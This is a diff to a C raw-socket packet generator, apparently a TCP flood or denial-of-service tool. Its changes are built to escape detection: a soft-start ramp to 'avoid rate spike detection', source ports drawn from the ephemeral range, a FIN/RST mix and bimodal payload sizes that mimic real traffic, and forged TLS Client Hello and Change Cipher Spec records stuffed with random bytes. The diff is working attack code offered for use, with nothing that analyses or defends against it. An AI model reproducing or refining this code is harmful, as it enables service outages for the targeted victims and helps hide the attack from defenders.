@@ -1532,11 +1532,11 @@ void *worker_thread(void *arg) {
         #define ST_ESTABLISHED 1
         #define ST_FORCE_EST   2
 
-        // Instant shock: skip SYN, blast immediately
-        #define SYN_MAX_RETRY  0
+        // Retry SYN 1x before force-establish (looks like real retransmit)
+        #define SYN_MAX_RETRY  1
 
-        // No ramp — full power from round 1
-        #define SOFT_START_ROUNDS 1
+        // Ramp up over 10 rounds (~1-2s) to avoid rate spike detection
+        #define SOFT_START_ROUNDS 10
 
 
 
@@ -1632,7 +1632,7 @@ void *worker_thread(void *arg) {
             // TCP header with space for Timestamp option (doff=8 = 32 bytes)
             struct tcphdr *th=(struct tcphdr*)(fr+V17ETH+V17IP);
             unsigned short p;
-            do { p = (unsigned short)(1024 + (fast_rand() % 64000)); } while(port_to_slot[p] != -1);
+            do { p = (unsigned short)(32768 + (fast_rand() % 28232)); } while(port_to_slot[p] != -1);
             slot_sp[b]=p;
             port_to_slot[p]=b;
             slot_seq[b]=fast_rand();
@@ -1970,12 +1970,12 @@ void *worker_thread(void *arg) {
 
                 // Phase 4: Per-slot adaptive churn threshold (5-300s)
                 if(slot_rn[b] > slot_churn_th[b]) {
-                    // Mix of RST and FIN/ACK for state exhaustion
-                    if (fast_rand() % 2 == 0) {
-                        flags = (8<<12)|0x004; // doff=8, RST=1 (keep TS header space)
+                    // 70% FIN+ACK (graceful), 30% RST (abrupt) — matches real traffic
+                    if (fast_rand() % 10 < 3) {
+                        flags = (8<<12)|0x004; // doff=8, RST
                         th->psh=0; th->ack=0; th->rst=1; th->fin=0; th->syn=0; th->urg=0;
                     } else {
-                        flags = (8<<12)|0x011; // doff=8, FIN=1, ACK=1
+                        flags = (8<<12)|0x011; // doff=8, FIN+ACK
                         th->psh=0; th->ack=1; th->rst=0; th->fin=1; th->syn=0; th->urg=0;
                     }
                     current_pl = 0;
@@ -2025,7 +2025,7 @@ void *worker_thread(void *arg) {
                     slot_ack[b] = fast_rand();
                     port_to_slot[slot_sp[b]] = -1;
                     unsigned short p2;
-                    do { p2 = (unsigned short)(1024 + (fast_rand() % 64000)); } while(port_to_slot[p2] != -1);
+                    do { p2 = (unsigned short)(32768 + (fast_rand() % 28232)); } while(port_to_slot[p2] != -1);
                     slot_sp[b] = p2;
                     port_to_slot[p2] = b;
                     slot_ch_sent[b] = 0;
@@ -2081,32 +2081,65 @@ void *worker_thread(void *arg) {
                     th->psh=1; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
                 }
                 
-                // Dynamic Payload Size (988 to 1428, even for checksum)
-                unsigned int raw_pl = 988 + (fast_rand() % 440);
-                if(raw_pl & 1) raw_pl++;
-                current_pl = raw_pl;
+                // Bimodal payload: 35% small (64-300), 65% large (900-1428)
+                unsigned int plr = fast_rand() % 100;
+                if (plr < 35) {
+                    current_pl = 64 + (fast_rand() % 237);
+                } else {
+                    current_pl = 900 + (fast_rand() % 529);
+                }
+                if(current_pl & 1) current_pl++;
                 tw[6] = htons(flags);
 
                 // Phase 2: L4/L5 Structured Payload
                 unsigned char *pl = fr + V17ETH + V17IP + V17TCP_TS;
                 if (args.port == 443) {
-                    // TLS Application Data framing (L5)
-                    int pl_off = 0;
-                    while (pl_off + 5 < (int)current_pl) {
-                        pl[pl_off] = 0x17;     // Application Data
-                        pl[pl_off+1] = 0x03;   // TLS 1.2
-                        pl[pl_off+2] = 0x03;
-                        int rem = (int)current_pl - pl_off - 5;
-                        int rec_len = (rem > 1398) ? 1398 : rem;
-                        if (rec_len > 64) rec_len -= (int)(fast_rand() % 32);
-                        pl[pl_off+3] = (rec_len >> 8) & 0xFF;
-                        pl[pl_off+4] = rec_len & 0xFF;
-                        pl_off += 5;
-                        int src_off = (int)((fast_rand() % (HUGE_PL_SIZE - rec_len)) & ~1);
-                        memcpy(pl + pl_off, huge_pl_buf + src_off, rec_len);
-                        pl_off += rec_len;
-                    }
-                    // Manual checksum for structured payload
+                    if (slot_rn[b] <= 1) {
+                        // First packets: TLS Client Hello (Content Type 22 = Handshake)
+                        pl[0] = 0x16; // Handshake
+                        pl[1] = 0x03; pl[2] = 0x01; // TLS 1.0 (Client Hello always 1.0)
+                        int hello_len = 200 + (int)(fast_rand() % 112); // 200-311 bytes
+                        if(hello_len & 1) hello_len++;
+                        pl[3] = (hello_len >> 8) & 0xFF; pl[4] = hello_len & 0xFF;
+                        // Handshake header: type=1 (ClientHello)
+                        pl[5] = 0x01;
+                        int inner = hello_len - 4;
+                        pl[6] = 0x00; pl[7] = (inner >> 8) & 0xFF; pl[8] = inner & 0xFF;
+                        // Version TLS 1.2 inside
+                        pl[9] = 0x03; pl[10] = 0x03;
+                        // Random (32 bytes)
+                        memcpy(pl + 11, huge_pl_buf + (fast_rand() % 4096), 32);
+                        // Rest: session ID + cipher suites + extensions (random-ish)
+                        int rest = hello_len - 38;
+                        if (rest > 0) {
+                            memcpy(pl + 43, huge_pl_buf + (fast_rand() % (HUGE_PL_SIZE - rest)), rest);
+                        }
+                        current_pl = 5 + hello_len;
+                        if(current_pl & 1) current_pl++;
+                    } else if (slot_rn[b] == 2) {
+                        // Change Cipher Spec (Content Type 20)
+                        pl[0] = 0x14; pl[1] = 0x03; pl[2] = 0x03;
+                        pl[3] = 0x00; pl[4] = 0x01; pl[5] = 0x01;
+                        current_pl = 6;
+                    } else {
+                        // TLS Application Data framing (L5)
+                        int pl_off = 0;
+                        while (pl_off + 5 < (int)current_pl) {
+                            pl[pl_off] = 0x17;     // Application Data
+                            pl[pl_off+1] = 0x03;   // TLS 1.2
+                            pl[pl_off+2] = 0x03;
+                            int rem = (int)current_pl - pl_off - 5;
+                            int rec_len = (rem > 1398) ? 1398 : rem;
+                            if (rec_len > 64) rec_len -= (int)(fast_rand() % 32);
+                            pl[pl_off+3] = (rec_len >> 8) & 0xFF;
+                            pl[pl_off+4] = rec_len & 0xFF;
+                            pl_off += 5;
+                            int src_off = (int)((fast_rand() % (HUGE_PL_SIZE - rec_len)) & ~1);
+                            memcpy(pl + pl_off, huge_pl_buf + src_off, rec_len);
+                            pl_off += rec_len;
+                        }
+                    } // end else (AppData)
+                    // Manual checksum for all TLS payload paths
                     unsigned short *plw = (unsigned short*)pl;
                     pl_sum_ch = 0;
                     for (int pi = 0; pi < (int)(current_pl/2); pi++) pl_sum_ch += plw[pi];
